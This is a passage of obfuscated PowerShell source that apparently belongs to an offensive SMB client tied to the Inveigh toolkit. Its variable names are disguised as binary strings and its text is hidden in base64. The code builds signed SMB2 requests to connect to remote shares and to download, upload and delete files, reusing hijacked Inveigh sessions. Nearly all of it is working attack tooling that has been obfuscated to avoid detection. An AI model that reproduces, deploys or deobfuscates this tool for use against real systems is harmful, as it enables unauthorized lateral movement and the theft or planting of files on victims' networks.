                                        ${01000101011000111} = "" + (${10010110011001110} / 1024000).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAwADAA')))) + "MB"
                                    }
                                    ${01101110101010111} = 0x70,0x00,0x00,0x00
                                    ${10100110010111111} = 0x02
                                    ${00000110110010011} = 0x01
                                    ${10000100010001101} = 0x58,0x00,0x00,0x00
                                    ${10110110111101000} = 0x00,0x00
                                    ${01100011101101010} = 8
                                    ${01100110011000011} = 0x02
                                    ${00111110000111110} = 0x05
                                    ${10000011101011001} = 0x50,0x00,0x00,0x00
                                    ${10000011000110000} = 0x00,0x00
                                    ${10011000110010111} = 1
                                    ${01010110011000111}++
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                                }
                                6
                                {
                                    if(${10010110011001110} -lt 65536)
                                    {
                                        ${01101110101111000} = ${10010110011001110}
                                    }
                                    else
                                    {
                                        ${01101110101111000} = 65536
                                    }
                                    ${00000110000111100} = 0
                                    ${00111000010001001} = 1
                                    ${01010110011000111}++
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                }
                            }
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))))
                        {
                            ${00110111110000001} = ${10111001100101101}
                            if(${00101011001100100} -ne 0)
                            {
                                ${00110111110000001}++
                            }
                            if(${01011001110100010} -lt 1024)
                            {
                                ${01000101011000111} = "" + ${01011001110100010} + "B"
                            }
                            elseif(${01011001110100010} -lt 1024000)
                            {
                                ${01000101011000111} = "" + (${01011001110100010} / 1024).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAwADAA')))) + "KB"
                            }
                            else
                            {
                                ${01000101011000111} = "" + (${01011001110100010} / 1024000).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAwADAA')))) + "MB"
                            }
                            ${01010110011000111}++
                            ${01111110110011010} = 0x01
                            ${10111101101100010} = 0x14
                            ${10110101001100110} = [System.BitConverter]::GetBytes(${01011001110100010})
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQASQBuAGYAbwBSAGUAcQB1AGUAcwB0AA==')))
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA'))))
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                        }
                        else
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdABGAGkAbgBkAFIAZQBxAHUAZQBzAHQA')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                    {
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x08,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${01010110011011101} = _00000101100010110 ${01101110101111000} ${00000110000111100} ${01111100001000010}
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101} 
                        ${10001001100110010} = _01001110110110100 ${01101111100110010}.Length ${00111011000011000}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000} 
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        sleep -m 5
                        if(${01101110101111000} -eq 65536)
                        {
                            ${10101111111010000} = 0
                            while(${01000100110110000}.Available -lt 8192 -and ${10101111111010000} -lt 10)
                            {
                                sleep -m $Sleep
                                ${10101111111010000}++
                            }
                        }
                        else
                        {
                            sleep -m $Sleep
                        }
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) -and ${01010110011000111} -eq 3)
                        {
                            ${01010110011000111}++
                            ${11000000100110110} = 1
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) -and ${01010110011000111} -eq 7)
                        {
                            if(!$NoProgress)
                            {
                                ${10000001000100101} = [Math]::Truncate(${00111000010001001} / ${00110111110000001} * 100)
                                Write-Progress -Activity $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAHcAbgBsAG8AYQBkAGkAbgBnACAAJAB7ADAAMAAwADEAMAAxADEAMAAxADAAMAAwADAAMAAwADAAMQB9ACAALQAgACQAewAwADEAMAAwADAAMQAwADEAMAAxADEAMAAwADAAMQAxADEAfQA='))) -Status $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAwADAAMAAwADAAMQAwADAAMAAxADAAMAAxADAAMQB9ACUAIABDAG8AbQBwAGwAZQB0AGUAOgA='))) -PercentComplete ${10000001000100101}
                            }
                            ${00111001100101100} = ${00011101010001010}[84..(${01101110101111000} + 83)]
                            if(!$Modify)
                            {
                                if(!${00100001011101001})
                                {
                                    ${00100001011101001} = New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAFMAdAByAGUAYQBtAA=='))) ${10110000110010100},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
                                }
                                ${00100001011101001}.Write(${00111001100101100},0,${00111001100101100}.Count)
                            }
                            else
                            {
                                ${00011100000111100}.AddRange(${00111001100101100})
                            }
                            if(${00111000010001001} -lt ${10110100110111101})
                            {
                                ${00000110000111100}+=65536
                                ${00111000010001001}++
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                            }
                            elseif(${00111000010001001} -eq ${10110100110111101} -and ${00111111111000110} -ne 0)
                            {
                                ${01101110101111000} = ${00111111111000110}
                                ${00000110000111100}+=65536
                                ${00111000010001001}++
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                            }
                            else
                            {
                                if(!$Modify)
                                {
                                    ${00100001011101001}.Close()
                                }
                                else
                                {
                                    [Byte[]]${00011100000111100} = ${00011100000111100}
                                    ,${00011100000111100}
                                }
                                ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABGAGkAbABlACAAZABvAHcAbgBsAG8AYQBkAGUAZAA=')))
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                            }
                        }
                        elseif([System.BitConverter]::ToString(${00011101010001010}[12..15]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzAC0AMAAxAC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                        }
                        else
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQASQBuAGYAbwBSAGUAcQB1AGUAcwB0AA==')))
                    {
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x11,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${01010110011011101} = _00111111011110011 ${01111110110011010} ${10111101101100010} ${01111100001000010} ${10110101001100110}
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}    
                        ${10001001100110010} = _01001110110110100 ${01101111100110010}.Length ${00111011000011000}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000}
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        if(${01011001110100010} -le 65536)
                        {
                            ${10001110110100101} = ${01011001110100010}
                        }
                        else
                        {
                            ${10001110110100101} = 65536
                        }
                        ${00111110010010011} = 0
                        ${01011100011110000} = 1
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA'))))
                        {
                            ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABGAGkAbABlACAAZABlAGwAZQB0AGUAZAA=')))
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                            ${01010110011000111}++
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))) -and ${01010110011000111} -eq 4)
                        {
                            ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABGAGkAbABlACAAdQBwAGwAbwBhAGQAZQBkAA==')))
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                        }
                        else
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAFIAZQBxAHUAZQBzAHQA')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                    {
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x03,0x00 0x1f,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${01010110011011101} = _10100111010010000 ${00111011010000000}
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}    
                        ${10001001100110010} = _01001110110110100 ${01101111100110010}.Length ${00111011000011000}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000}
                        try
                        {
                            ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                            ${01001101101100010}.Flush()
                            ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        }
                        catch
                        {
                            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcwBzAGkAbwBuACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAGkAcwAgAGMAbABvAHMAZQBkAA==')))
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                        }
                        if(${10000110001100100} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
                        {
                            if([System.BitConverter]::ToString(${00011101010001010}[12..15]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                            {
                                ${01011000010100000} = [System.BitConverter]::ToString(${00011101010001010}[12..15])
                                switch(${01011000010100000})
                                {
                                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBjAC0AMAAwAC0AMAAwAC0AYwAwAA==')))
                                    {
                                        ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGgAYQByAGUAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyAC0AMAAwAC0AMAAwAC0AYwAwAA==')))
                                    {
                                        ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABBAGMAYwBlAHMAcwAgAGQAZQBuAGkAZQBkAA==')))
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    default
                                    {
                                        ${01011000010100000} = ${01011000010100000} -replace "-",""
                                        ${01100110111011000} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABUAHIAZQBlACAAYwBvAG4AbgBlAGMAdAAgAGUAcgByAG8AcgAgAGMAbwBkAGUAIAAwAHgAJAB7ADAAMQAwADEAMQAwADAAMAAwADEAMAAxADAAMAAwADAAMAB9AA==')))
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                }
                            }
                            elseif($refresh)
                            {
                                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAGUAcwBzAGkAbwBuACAAcgBlAGYAcgBlAHMAaABlAGQA')))
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            elseif(!${00011000100111101})
                            {
                                ${10111100001011001} = "\\" + ${10011000110000100} + "\" + ${01011010010000111}
                                ${00111011010000000} = [System.Text.Encoding]::Unicode.GetBytes(${10111100001011001})
                                ${00011000100111101} = $true
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBvAGMAdABsAFIAZQBxAHUAZQBzAHQA')))
                                ${00000100001111000} = ""
                            }
                            else
                            {
                                if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))))
                                {
                                    ${00000100001111000} = [System.Text.Encoding]::Unicode.GetBytes(${10000110000000001})
                                    ${11000000100110110} = 2
                                }
                                else
                                {
                                    ${11000000100110110} = 1
                                }
                                ${10000111101100010} = ${00011101010001010}[40..43]
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))))
                                {
                                    ${00000100001111000} = [System.Text.Encoding]::Unicode.GetBytes(${10000110000000001})
                                }
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                    {
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x04,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${01010110011011101} = _01011000110010010
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}
                        ${10001001100110010} = _01001110110110100 ${01101111100110010}.Length ${00111011000011000}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000}
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000}
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        if(${00010111101111000} -and !$Logoff)
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                        }
                        else
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAFIAZQBxAHUAZQBzAHQA')))
                    {
                        if(!$Modify)
                        {
                            ${00010011100011010}.BaseStream.Seek(${00111110010010011},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBlAGcAaQBuAA==')))) > $null
                            ${00010011100011010}.Read(${10100100100111011},0,${01100000100010011}) > $null
                        }
                        else
                        {
                            ${10100100100111011} = $Source[${00111110010010011}..(${00111110010010011}+${10001110110100101})]
                        }
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x09,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABpAHQAQwBoAGEAcgBnAGUA')))] = 0x01,0x00
                        ${01010110011011101} = _00110101010001111 ${10001110110100101} ${00111110010010011} ${01111100001000010} ${10100100100111011}
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101} 
                        ${10001001100110010} = _01001110110110100 ${01101111100110010}.Length ${00111011000011000}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000} 
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        if(${01011100011110000} -lt ${10111001100101101})
                        {
                            if(!$NoProgress)
                            {
                                ${10000001000100101} = [Math]::Truncate(${01011100011110000} / ${00110111110000001} * 100)
                                Write-Progress -Activity $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHAAbABvAGEAZABpAG4AZwAgACQAewAwADAAMAAxADAAMQAxADAAMQAwADAAMAAwADAAMAAwADEAfQAgAC0AIAAkAHsAMAAxADAAMAAwADEAMAAxADAAMQAxADAAMAAwADEAMQAxAH0A'))) -Status $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAwADAAMAAwADAAMQAwADAAMAAxADAAMAAxADAAMQB9ACUAIABDAG8AbQBwAGwAZQB0AGUAOgA='))) -PercentComplete ${10000001000100101}
                            }
                            ${00111110010010011}+=65536
                            ${01011100011110000}++
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAFIAZQBxAHUAZQBzAHQA')))
                        }
                        elseif(${01011100011110000} -eq ${10111001100101101} -and ${00101011001100100} -ne 0)
                        {
                            ${10001110110100101} = ${00101011001100100}
                            ${00111110010010011}+=65536
                            ${01011100011110000}++
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAFIAZQBxAHUAZQBzAHQA')))
                        }
                        else
                        {
                            ${01010110011000111}++
                            ${01111110110011010} = 0x01
                            ${10111101101100010} = 0x04
                            ${10110101001100110} = ${01000010000111100} +
                                                        ${01100111110011110} +
                                                        ${01000010011011100} +
                                                        ${10001110010010000} + 
                                                        0x00,0x00,0x00,0x00,
                                                        0x00,0x00,0x00,0x00
                            if(!$Modify)
                            {
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQASQBuAGYAbwBSAGUAcQB1AGUAcwB0AA==')))
                            }
                            else
                            {
                                ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABGAGkAbABlACAAdQBwAGwAbwBhAGQAZQBkACAAZgByAG8AbQAgAG0AZQBtAG8AcgB5AA==')))
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                            }
                        }
                    }
                }
            }
        }
    }
    catch
    {
        echo "[-] $($_.Exception.Message)"
    }
    finally
    {  
        if(${00100001011101001}.Handle)
        {
            ${00100001011101001}.Close()
        }
        if(${01100101100100100}.Handle)
        {
            ${00010011100011010}.Close()
            ${01100101100100100}.Close()
        }
        if(${00010111101111000} -and $Inveigh)
        {
            $inveigh.session_lock_table[$session] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAbgA=')))
            $inveigh.session_message_ID_table[$session] = ${01101111101011000}
            $inveigh.session[$session] | ? {$_."Last Activity" = Get-Date -format s}
        }
        if(!${00010111101111000} -or $Logoff)
        {
            ${01000100110110000}.Close()
            ${01001101101100010}.Close()
        }
    }
}
    if(!$Modify -or $Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))))
    {
        echo ${01100110111011000}
    }
    elseif(${01100110111011000})
    {
        Write-Verbose ${01100110111011000}
    }
}
